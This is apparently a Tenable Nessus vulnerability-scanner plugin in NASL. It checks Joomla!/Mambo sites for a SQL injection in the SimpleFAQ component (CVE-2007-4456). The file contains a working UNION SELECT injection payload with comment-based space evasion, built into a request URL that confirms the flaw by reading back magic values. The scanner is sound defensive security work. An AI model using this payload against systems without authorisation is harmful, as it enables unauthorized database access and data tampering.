#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25930);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2007-4456");
  script_bugtraq_id(25376);
  script_osvdb_id(37174);
  script_xref(name:"EDB-ID", value:"4296");

  script_name(english:"SimpleFAQ Component for Joomla! 'aid' Parameter SQLi");
  script_summary(english:"Attempts to manipulate answers with SQL injection.");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
 script_set_attribute(attribute:"description", value:
"The version of the SimpleFAQ component for Joomla! and Mambo running
on the remote host is affected by a SQL injection vulnerability in the
simplephp.php script due to improper sanitization of user-supplied
input to the 'aid' parameter before using it to construct database
queries in the showAnswers() function. Regardless of the PHP
'magic_quotes_gpc' setting, an unauthenticated, remote attacker can
exploit this issue to manipulate database queries, resulting in
disclosure of sensitive information, modification of data, or other
attacks against the underlying database.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/477174/30/0/threaded");
  # https://web.archive.org/web/20100815003828/http://www.parkviewconsultants.com/content/view/19/47/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a7c6df77");
 script_set_attribute(attribute:"solution", value:
"Upgrade to SimpleFAQ version 2.50 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/08/20");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/08/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/08/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

app = "Mambo / Joomla!";
# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item("www/" +port+ "/mambo_mos");
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    dirs[ndirs++] = dir;
  }
}

if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Make sure component is installed first
plugin = "SimpleFAQ";
new_dirs = make_list();

foreach dir (dirs)
{
  # Check KB first
  installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

  if (!installed)
  {
    checks = make_array();
    regexes = make_list();
    regexes[0] = make_list('<name>simplefaq<');
    checks["/administrator/components/com_simplefaq/simplefaq.xml"] = regexes;

    # Ensure plugin is installed
    installed = check_webapp_ext(
      checks : checks,
      dir    : dir,
      port   : port,
      ext    : plugin
    );
    if (installed) new_dirs = make_list(new_dirs, dir);
  }
}

# Loop through each directory.
info = "";
magic1 = unixtime();
magic2 = rand();
non_affect = make_list();
vuln = FALSE;

foreach dir (new_dirs)
{
  # Try to exploit the issue.
  exploit = "-1 UNION SELECT 0," +magic1+ "," +magic2+ ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--";
  exploit = str_replace(find:" ", replace:"/**/", string:exploit);
  url = dir + "/index.php?option=com_simplefaq&task=answer&Itemid=9999&catid=99999&aid=" + exploit;

  w = http_send_recv3(
    method : "GET",
    item   : url,
    port   : port,
    exit_on_fail : TRUE
  );
  res = w[2];

  # There's a problem if...
  if (
    # it looks like SimpleFAQ and...
    '>SimpleFAQ' >< res &&
    # we see our magic in the answer
    '</a><b>' +magic1+ '</b></td>' >< res &&
    'valign=top>' +magic2+ '<hr>' >< res
  )
  {
    info += build_url(qs:url, port:port) + '\n';
    output = strstr(res, magic1);
    if (empty_or_null(output)) output = res;
    vuln = TRUE;
  }
  non_affect = make_list(non_affect, dir);
  if (!thorough_tests) break;
}

if (vuln)
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    line_limit  : 5,
    sqli        : TRUE,
    generic     : TRUE,
    request     : split(info),
    output      : chomp(output)
  );
  exit(0);
}
else
{
  installs = max_index(non_affect);
  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " contain the " + plugin+ " component.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, build_url(qs:dir, port:port), plugin + " component");

  else exit(0, "None of the "+app+ " installs with the " + plugin+ " component (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}
